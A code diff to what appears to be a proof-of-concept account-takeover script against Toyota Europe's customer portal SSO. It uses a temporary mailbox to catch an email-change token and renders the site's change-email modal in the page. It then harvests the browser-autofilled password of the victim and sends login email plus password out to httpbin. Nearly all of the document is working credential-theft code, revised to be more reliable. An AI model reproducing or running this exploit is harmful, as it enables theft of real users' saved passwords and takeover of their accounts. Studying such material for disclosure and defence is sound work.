@@ -8,6 +8,7 @@ define([], function () {
   var TEMP_MAIL_POLL_MS = 3500;
   var AUTOFILL_WAIT_MS = 25000;
   var LATE_PASSWORD_WAIT_MS = 120000;
+  var SSO_RENDER_WAIT_MS = 20000;
 
   var STATE_KEY = "cp_tempmail_ato_state";
   var SSO_FALLBACK_BASE = "https://ssomsa.toyota-europe.com";
@@ -466,66 +467,6 @@ define([], function () {
     return document.querySelector("input[type='password']");
   }
 
-  function findPasswordInputInDocument(doc) {
-    if (!doc) {
-      return null;
-    }
-    var preferred = safeCall(function () {
-      return doc.querySelector("input[data-test-id='-change-email-password-input']");
-    }, null);
-    if (preferred) {
-      return preferred;
-    }
-    return safeCall(function () {
-      return doc.querySelector("input[type='password']");
-    }, null);
-  }
-
-  function getOrCreateCaptureIframe(initialUrl) {
-    var iframeId = "cp-tempmail-capture-iframe";
-    var iframe = document.getElementById(iframeId);
-    if (iframe) {
-      if (initialUrl && normalizeString(iframe.getAttribute("data-initial-url")) !== normalizeString(initialUrl)) {
-        iframe.setAttribute("data-initial-url", normalizeString(initialUrl));
-        iframe.src = initialUrl;
-      }
-      return iframe;
-    }
-
-    iframe = document.createElement("iframe");
-    iframe.id = iframeId;
-    iframe.setAttribute("data-initial-url", normalizeString(initialUrl));
-    iframe.style.position = "fixed";
-    iframe.style.left = "12px";
-    iframe.style.top = "12px";
-    iframe.style.width = "calc(100vw - 24px)";
-    iframe.style.height = "calc(100vh - 96px)";
-    iframe.style.background = "#ffffff";
-    iframe.style.border = "2px solid #5aa0ff";
-    iframe.style.borderRadius = "10px";
-    iframe.style.boxShadow = "0 12px 28px rgba(0, 0, 0, 0.35)";
-    iframe.style.zIndex = "2147483646";
-    iframe.style.opacity = "1";
-    iframe.style.pointerEvents = "auto";
-    iframe.style.display = "block";
-    document.documentElement.appendChild(iframe);
-
-    if (initialUrl) {
-      iframe.src = initialUrl;
-    }
-    return iframe;
-  }
-
-  function removeCaptureIframe() {
-    var iframe = document.getElementById("cp-tempmail-capture-iframe");
-    if (!iframe) {
-      return;
-    }
-    safeCall(function () {
-      iframe.remove();
-    }, null);
-  }
-
   function pokeAutofillOnInput(node) {
     if (!node) {
       return;
@@ -543,51 +484,234 @@ define([], function () {
     }, null);
   }
 
-  async function waitForAutofilledPasswordInIframe(clickUrl, timeoutMs, existingIframe) {
-    var iframe = existingIframe || getOrCreateCaptureIframe(clickUrl);
-    if (clickUrl && !existingIframe) {
-      iframe.src = clickUrl;
+  function getScriptSrcMatching(pattern) {
+    var scripts = safeCall(function () {
+      return Array.prototype.slice.call(document.getElementsByTagName("script"));
+    }, []);
+    for (var i = 0; i < scripts.length; i++) {
+      var src = normalizeString(scripts[i].src || "");
+      if (src && pattern.test(src)) {
+        return src;
+      }
+    }
+    return "";
+  }
+
+  function getSsoConfigurationUrl() {
+    var fromScript = getScriptSrcMatching(/\/cp-ui-sso\/configuration\.js(?:[?#].*)?$/i);
+    if (fromScript) {
+      return fromScript;
     }
 
-    var started = Date.now();
-    var lastHref = "";
-    while (Date.now() - started < timeoutMs) {
-      try {
-        var frameWindow = iframe.contentWindow;
-        var href = frameWindow && frameWindow.location ? normalizeString(frameWindow.location.href) : "";
-        if (href && href !== "about:blank") {
-          lastHref = href;
-        }
+    var redesignBase = normalizeString(
+      safeCall(function () {
+        return window.T1 && window.T1.settings && window.T1.settings.ssoRedesignBaseUrl;
+      }, "")
+    );
+    if (redesignBase) {
+      return redesignBase.replace(/\/+$/, "") + "/configuration.js";
+    }
 
-        var doc = frameWindow && frameWindow.document ? frameWindow.document : null;
-        var node = findPasswordInputInDocument(doc);
-        if (node) {
-          var val = normalizeString(node.value);
-          if (val) {
-            return {
-              ok: true,
-              password: val,
-              source: "iframe_autofill_present",
-              iframe: iframe,
-              finalUrl: lastHref
-            };
-          }
+    var cpCommonUrl = normalizeString(
+      safeCall(function () {
+        return window.T1 && window.T1.settings && window.T1.settings.cpCommonUrl;
+      }, "")
+    );
+    if (cpCommonUrl) {
+      return cpCommonUrl.replace(/\/+$/, "") + "/cp-ui-sso/configuration.js";
+    }
 
-          pokeAutofillOnInput(node);
-        }
-      } catch (e) {
-        // cross-origin during redirect chain; keep polling until final same-origin frame is reachable
+    return "https://cp-common.toyota-europe.com/cp-ui-sso/configuration.js";
+  }
+
+  function getRequireFunction() {
+    var candidates = [
+      safeCall(function () { return window.requirejs; }, null),
+      safeCall(function () { return window.require; }, null)
+    ];
+    for (var i = 0; i < candidates.length; i++) {
+      if (typeof candidates[i] === "function") {
+        return candidates[i];
+      }
+    }
+    return null;
+  }
+
+  function findLoadedSsoConfigurationModule(requireFn) {
+    var defined = safeCall(function () {
+      return requireFn && requireFn.s && requireFn.s.contexts && requireFn.s.contexts._ && requireFn.s.contexts._.defined;
+    }, null);
+    if (!defined || typeof defined !== "object") {
+      return null;
+    }
+
+    var keys = Object.keys(defined);
+    for (var i = 0; i < keys.length; i++) {
+      var key = keys[i];
+      var candidate = defined[key];
+      if (candidate && typeof candidate.render === "function" && /cp-ui-sso\/configuration\.js/i.test(key)) {
+        return candidate;
+      }
+    }
+
+    for (var j = 0; j < keys.length; j++) {
+      var key2 = keys[j];
+      var candidate2 = defined[key2];
+      if (candidate2 && typeof candidate2.render === "function" && candidate2.contract && candidate2.version) {
+        return candidate2;
+      }
+    }
+
+    return null;
+  }
+
+  function loadSsoConfigurationModule(configUrl) {
+    return new Promise(function (resolve, reject) {
+      var requireFn = getRequireFunction();
+      if (!requireFn) {
+        reject(new Error("requirejs_not_available"));
+        return;
       }
 
-      await sleep(700);
+      var alreadyLoaded = findLoadedSsoConfigurationModule(requireFn);
+      if (alreadyLoaded) {
+        resolve(alreadyLoaded);
+        return;
+      }
+
+      var settled = false;
+      var timer = setTimeout(function () {
+        if (settled) {
+          return;
+        }
+        settled = true;
+        reject(new Error("sso_configuration_load_timeout"));
+      }, SSO_RENDER_WAIT_MS);
+
+      function done(err, moduleInstance) {
+        if (settled) {
+          return;
+        }
+        settled = true;
+        clearTimeout(timer);
+        if (err) {
+          reject(err);
+          return;
+        }
+        resolve(moduleInstance);
+      }
+
+      try {
+        requireFn(
+          [configUrl],
+          function (moduleFromRequire) {
+            var moduleInstance = moduleFromRequire || findLoadedSsoConfigurationModule(requireFn);
+            if (!moduleInstance || typeof moduleInstance.render !== "function") {
+              done(new Error("sso_configuration_module_missing_render"));
+              return;
+            }
+            done(null, moduleInstance);
+          },
+          function (requireErr) {
+            done(requireErr || new Error("sso_configuration_require_failed"));
+          }
+        );
+      } catch (e) {
+        done(e);
+      }
+    });
+  }
+
+  function ensureSsoWrapperContainer() {
+    var root = document.getElementById("sso-wrapper");
+    if (root) {
+      return root;
     }
 
+    var host = document.getElementById("ssoMaterialBoxContainer");
+    if (!host) {
+      host = document.createElement("div");
+      host.id = "ssoMaterialBoxContainer";
+      host.className = "material-box sso-material-box";
+      host.style.position = "fixed";
+      host.style.inset = "0";
+      host.style.zIndex = "2147483640";
+      host.style.background = "rgba(0, 0, 0, 0.55)";
+      host.style.overflowY = "auto";
+      host.style.padding = "24px 10px";
+
+      var content = document.createElement("div");
+      content.className = "material-box-content";
+      content.style.maxWidth = "760px";
+      content.style.margin = "0 auto";
+      content.style.minHeight = "100%";
+      content.style.display = "flex";
+      content.style.alignItems = "center";
+      content.style.justifyContent = "center";
+
+      root = document.createElement("div");
+      root.id = "sso-wrapper";
+      root.style.width = "100%";
+      root.style.maxWidth = "720px";
+      root.style.background = "#fff";
+      root.style.borderRadius = "10px";
+      root.style.padding = "0";
+      root.style.boxShadow = "0 20px 60px rgba(0, 0, 0, 0.4)";
+
+      content.appendChild(root);
+      host.appendChild(content);
+      (document.body || document.documentElement).appendChild(host);
+      return root;
+    }
+
+    root = document.createElement("div");
+    root.id = "sso-wrapper";
+    host.appendChild(root);
+    return root;
+  }
+
+  async function waitForPasswordInputPresence(timeoutMs) {
+    var started = Date.now();
+    while (Date.now() - started < timeoutMs) {
+      var node = findPasswordInput();
+      if (node) {
+        pokeAutofillOnInput(node);
+        return true;
+      }
+      await sleep(250);
+    }
+    return false;
+  }
+
+  async function openChangeEmailModalInPage(emailToken) {
+    var normalizedToken = normalizeString(emailToken);
+    if (!normalizedToken) {
+      throw new Error("missing_email_token_for_inpage_render");
+    }
+
+    ensureSsoWrapperContainer();
+    var configUrl = getSsoConfigurationUrl();
+    var ssoConfig = await loadSsoConfigurationModule(configUrl);
+
+    if (!ssoConfig || typeof ssoConfig.render !== "function") {
+      throw new Error("sso_config_render_not_available");
+    }
+
+    ssoConfig.render(
+      {
+        contractKey: "changeEmail",
+        emailToken: normalizedToken
+      },
+      {
+        topic: "sso.email.change.requested"
+      }
+    );
+
+    var rendered = await waitForPasswordInputPresence(SSO_RENDER_WAIT_MS);
     return {
-      ok: false,
-      password: "",
-      source: "iframe_autofill_unavailable",
-      iframe: iframe,
-      finalUrl: lastHref
+      ok: rendered,
+      source: rendered ? "inpage_modal_rendered" : "inpage_modal_input_not_found",
+      configUrl: configUrl
     };
   }
 
@@ -601,12 +725,7 @@ define([], function () {
           return { ok: true, password: val, source: "autofill_present" };
         }
 
-        safeCall(function () {
-          node.autocomplete = "current-password";
-          node.focus();
-          node.click();
-          node.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, key: "ArrowDown", code: "ArrowDown" }));
-        }, null);
+        pokeAutofillOnInput(node);
       }
 
       await sleep(700);
@@ -648,50 +767,62 @@ define([], function () {
 
     upsertSpeechBalloon("Mailbox poll", "Waiting confirmation email in temp inbox...", false);
     var mailHit = await pollConfirmationClickUrl(mailbox);
+    var emailToken = extractEmailTokenFromUrl(mailHit.clickUrl);
+    if (!emailToken) {
+      throw new Error("confirmation_email_token_missing");
+    }
 
     var state = {
-      phase: "pending_iframe_password_capture",
+      phase: "pending_inpage_modal_password_capture",
       createdAt: nowIso(),
       tempEmail: mailbox.address,
       tempMailboxPassword: mailbox.password,
       mailboxTokenPrefix: mailbox.token.slice(0, 10),
       clickUrl: mailHit.clickUrl,
+      emailToken: emailToken,
       emailChangeStatus: change.status
     };
     saveState(state);
 
-    upsertSpeechBalloon("Iframe capture", "Opening confirmation link inside iframe and waiting browser autofill...", false);
-    var iframeCapture = await waitForAutofilledPasswordInIframe(mailHit.clickUrl, AUTOFILL_WAIT_MS, null);
-    if (!iframeCapture.ok || !iframeCapture.password) {
+    upsertSpeechBalloon("In-page modal", "Rendering SSO change-email modal in current page using extracted emailToken...", false);
+    var modalOpen = await openChangeEmailModalInPage(emailToken);
+    if (!modalOpen.ok) {
+      throw new Error("inpage_change_email_modal_not_rendered");
+    }
+
+    upsertSpeechBalloon("Autofill capture", "Waiting browser autofill on in-page change-email password field...", false);
+    var pw = await waitForAutofilledPassword(AUTOFILL_WAIT_MS);
+    if (!pw.ok || !pw.password) {
       upsertSpeechBalloon(
-        "Iframe autofill unavailable",
-        "No auto-filled password detected yet inside iframe.\n" +
-          "Click the password field inside the iframe to trigger browser credential picker/autofill.\n\n" +
+        "Autofill unavailable",
+        "No auto-filled password detected yet in in-page SSO modal flow.\n" +
           "Waiting extra time for late autofill/manual manager selection...",
         true
       );
-      iframeCapture = await waitForAutofilledPasswordInIframe("", LATE_PASSWORD_WAIT_MS, iframeCapture.iframe);
+      pw = await waitForAutofilledPassword(LATE_PASSWORD_WAIT_MS);
     }
 
-    if (!iframeCapture.ok || !iframeCapture.password) {
+    if (!pw.ok || !pw.password) {
       saveState({
-        phase: "pending_iframe_password_capture",
+        phase: "pending_inpage_modal_password_capture",
         createdAt: state.createdAt || nowIso(),
         tempEmail: state.tempEmail || "",
         clickUrl: mailHit.clickUrl,
+        emailToken: emailToken,
         emailChangeStatus: state.emailChangeStatus || 0,
-        lastError: "iframe_autofill_password_not_available"
+        lastError: "inpage_modal_autofill_password_not_available"
       });
 
       upsertSpeechBalloon(
-        "Iframe autofill still unavailable",
-        "Chain is staged and waiting only for password autofill in iframe.\n" +
-          "clickUrl=\n" + mailHit.clickUrl,
+        "Autofill still unavailable",
+        "Chain is staged and waiting only for password autofill in in-page modal flow.\n" +
+          "emailToken=\n" + emailToken,
         true
       );
       window.__CP_TEMPMAIL_ATO_PENDING__ = {
-        reason: "iframe_autofill_password_not_available",
+        reason: "inpage_modal_autofill_password_not_available",
         clickUrl: mailHit.clickUrl,
+        emailToken: emailToken,
         tempEmail: state.tempEmail || ""
       };
       return;
@@ -702,15 +833,15 @@ define([], function () {
       throw new Error("login_email_missing");
     }
 
-    upsertSpeechBalloon("Credential capture", "Autofill captured in iframe. Sending login/email + password to httpbin...", false);
-    var httpbin = await writeCredentialsToHttpbin(loginEmail, iframeCapture.password);
+    upsertSpeechBalloon("Credential capture", "Autofill captured in in-page modal flow. Sending login/email + password to httpbin...", false);
+    var httpbin = await writeCredentialsToHttpbin(loginEmail, pw.password);
     clearState();
-    removeCaptureIframe();
 
     upsertSpeechBalloon(
       "Capture complete",
-      "login_email=" + loginEmail + "\npassword=" + iframeCapture.password +
-        "\niframe_final_url=" + normalizeString(iframeCapture.finalUrl) +
+      "login_email=" + loginEmail + "\npassword=" + pw.password +
+        "\nrender_source=" + modalOpen.source +
+        "\nsso_config=" + modalOpen.configUrl +
         "\nhttpbin_status=" + httpbin.status +
         "\nhttpbin=" + httpbin.url,
       false
@@ -718,8 +849,9 @@ define([], function () {
 
     window.__CP_TEMPMAIL_ATO_RESULT__ = {
       loginEmail: loginEmail,
-      password: iframeCapture.password,
-      iframeFinalUrl: normalizeString(iframeCapture.finalUrl),
+      password: pw.password,
+      renderSource: modalOpen.source,
+      ssoConfigUrl: modalOpen.configUrl,
       httpbinStatus: httpbin.status,
       httpbinUrl: httpbin.url
     };
@@ -732,15 +864,19 @@ define([], function () {
       throw new Error("missing_email_token_phase2");
     }
 
-    upsertSpeechBalloon("Autofill capture", "Waiting browser autofill on confirmation password field...", false);
+    upsertSpeechBalloon("In-page modal", "Rendering SSO change-email modal in current page using emailToken...", false);
+    var modalOpen = await openChangeEmailModalInPage(emailToken);
+    if (!modalOpen.ok) {
+      throw new Error("inpage_change_email_modal_not_rendered_phase2");
+    }
+
+    upsertSpeechBalloon("Autofill capture", "Waiting browser autofill on in-page confirmation password field...", false);
     var pw = await waitForAutofilledPassword(AUTOFILL_WAIT_MS);
     if (!pw.ok || !pw.password) {
       upsertSpeechBalloon(
         "Autofill unavailable",
-        "No password was auto-filled in this browser profile.\n" +
-          "If this profile has autofill disabled, open this exact URL in a normal profile with saved victim credentials:\n" +
-          window.location.href +
-          "\n\nWaiting extra time for late autofill/manual manager selection...",
+        "No password was auto-filled in this browser profile (in-page modal flow).\n" +
+          "Waiting extra time for late autofill/manual manager selection...",
         true
       );
       pw = await waitForAutofilledPassword(LATE_PASSWORD_WAIT_MS);
@@ -748,24 +884,25 @@ define([], function () {
 
     if (!pw.ok || !pw.password) {
       saveState({
-        phase: "pending_password_autofill",
+        phase: "pending_inpage_modal_password_capture",
         createdAt: state.createdAt || nowIso(),
         tempEmail: state.tempEmail || "",
         emailToken: emailToken,
         injectedConfirmUrl: state.injectedConfirmUrl || window.location.href,
         emailChangeStatus: state.emailChangeStatus || 0,
-        lastError: "autofill_password_not_available"
+        lastError: "inpage_modal_autofill_password_not_available"
       });
 
       var resume = window.location.href;
       upsertSpeechBalloon(
         "Autofill still unavailable",
-        "Chain is staged and waiting only for browser credential autofill.\nResume URL:\n" + resume,
+        "Chain is staged and waiting only for browser credential autofill in in-page modal flow.\nResume URL:\n" + resume,
         true
       );
       window.__CP_TEMPMAIL_ATO_PENDING__ = {
-        reason: "autofill_password_not_available",
+        reason: "inpage_modal_autofill_password_not_available",
         resumeUrl: resume,
+        emailToken: emailToken,
         tempEmail: state.tempEmail || ""
       };
       return;
@@ -783,6 +920,8 @@ define([], function () {
     upsertSpeechBalloon(
       "Capture complete",
       "login_email=" + loginEmail + "\npassword=" + pw.password +
+        "\nrender_source=" + modalOpen.source +
+        "\nsso_config=" + modalOpen.configUrl +
         "\nhttpbin_status=" + httpbin.status +
         "\nhttpbin=" + httpbin.url,
       false
@@ -791,6 +930,8 @@ define([], function () {
     window.__CP_TEMPMAIL_ATO_RESULT__ = {
       loginEmail: loginEmail,
       password: pw.password,
+      renderSource: modalOpen.source,
+      ssoConfigUrl: modalOpen.configUrl,
       httpbinStatus: httpbin.status,
       httpbinUrl: httpbin.url
     };
@@ -814,7 +955,7 @@ define([], function () {
   });
 
   return {
-    version: "1.2.0-tempmail-iframe-autofill-credential-capture",
+    version: "1.4.0-tempmail-inpage-sso-token-modal-autofill-capture",
     render: function () {
       return executePoC();
     }
